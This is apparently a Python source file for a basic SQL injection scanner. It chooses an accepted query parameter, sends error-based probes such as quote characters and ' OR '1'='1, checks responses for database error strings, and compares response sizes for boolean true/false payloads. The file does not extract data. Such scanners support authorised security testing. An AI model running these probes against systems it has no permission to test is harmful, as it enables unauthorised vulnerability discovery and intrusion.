import requests

PARAM_CANDIDATES = ["q", "id", "search", "name"]
ERROR_MARKERS = ["sql syntax", "mysql", "sqlite", "psql", "oracle", "ora-"]

def try_params(url, params):
    try:
        r = requests.get(url, params=params, timeout=6)
        return r.status_code, r.text, r.headers.get("Content-Type", "")
    except Exception:
        return None, "", ""

def test_sqli(url):
    findings = []

    # pick a baseline param that the endpoint accepts
    baseline_len = None
    chosen_param = None
    for p in PARAM_CANDIDATES:
        code, text, ctype = try_params(url, {p: "test"})
        if code == 200:
            baseline_len = len(text)
            chosen_param = p
            break
    if chosen_param is None:
        return findings  # nothing to test

    # error-based probes
    error_payloads = ["'", "\"", "'--", "' OR '1'='1", "\" OR \"1\"=\"1"]
    for pay in error_payloads:
        code, text, _ = try_params(url, {chosen_param: pay})
        if code and any(e in text.lower() for e in ERROR_MARKERS):
            findings.append((url, chosen_param, pay, "error-marker"))
            return findings  # one solid hit is enough

    # boolean-based (size difference)
    true_payloads = [f"test' OR '1'='1", f"test\") OR (\"1\"=\"1"]
    false_payloads = [f"test' AND '1'='2", f"test\") AND (\"1\"=\"2"]

    for tp, fp in zip(true_payloads, false_payloads):
        code_t, text_t, _ = try_params(url, {chosen_param: tp})
        code_f, text_f, _ = try_params(url, {chosen_param: fp})
        if code_t == 200 and code_f == 200:
            if abs(len(text_t) - len(text_f)) > 50 or text_t != text_f:
                findings.append((url, chosen_param, "boolean-diff", f"{len(text_t)} vs {len(text_f)}"))
                break

    return findings
 
